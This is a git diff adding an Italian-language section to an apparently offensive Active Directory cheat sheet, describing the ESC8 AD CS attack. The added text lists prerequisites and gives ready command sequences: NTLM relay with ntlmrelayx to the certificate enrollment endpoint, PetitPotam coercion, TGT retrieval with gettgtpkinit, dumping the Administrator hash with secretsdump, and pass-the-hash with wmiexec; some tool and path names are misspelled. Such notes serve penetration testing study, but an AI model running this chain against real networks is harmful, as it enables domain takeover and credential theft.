@@ -90,6 +90,39 @@ impacket-ntlmrelayx -6 -t ldaps://<DC-IP> -wh fakewpad.adlab.com -l loot
 ### Attacco 3. Sfruttamento ESC 8 ADCS 🔓🧑🏼‍💻
 <img src="petit.png" width="800">
 
+#### Prerequisiti
+
+➤ Vulnerabilità PetitPotam sui domain controller.
+
+➤ Per diventare DA cerca tramite BH template enabled i cuoi domain controller possono fare Enroll o Autoenroll.
+
+➤ Protocollo HTTP abilitato su AD CS.
+
+➤ Ci devono essere almeno 2 Domain controller. Altrimentiva bene anche un Domain Controller e una CA separata.
+
+#### Proof of concept
+```
+# On first terminal
+ntmlrelayx.py -t http://IP/certsrv/certnsh.asp -smb2support --adcs --template DomainController
+
+# On second terminal
+python3 PetitPotam.py -d <domain> -u <user> -p <password> <IP_Attacker> <IP_DomainController>
+```
+
+Una volta ottenuto il certificato base64 lo copi e lo inserisci dentro la variabile **pfxdata = base64.b64decode("INSERISCI QUI")** del file **gettgtpkinit.py**, il quale ti genererà un TGT che userai per tirare fuori dal DC hash del **Administrator**.
+
+```
+python3 gettgtpkinit.py file.ccache
+KRB5CCNAME=file.ccache secretsdump.py -k -no-pass -just-dc-user Administrator @FQDN_DC
+```
+
+Infine PTH per accedere al Domain Controller
+
+```
+wmiexec.py -hashes :<HASH> domain/Administrator@<IP_DomainController>
+```
+
+
 -----------------
 ### Attacco 4. LDAP signing not required and LDAP channel binding disabled 🔓🧑🏼‍💻
 
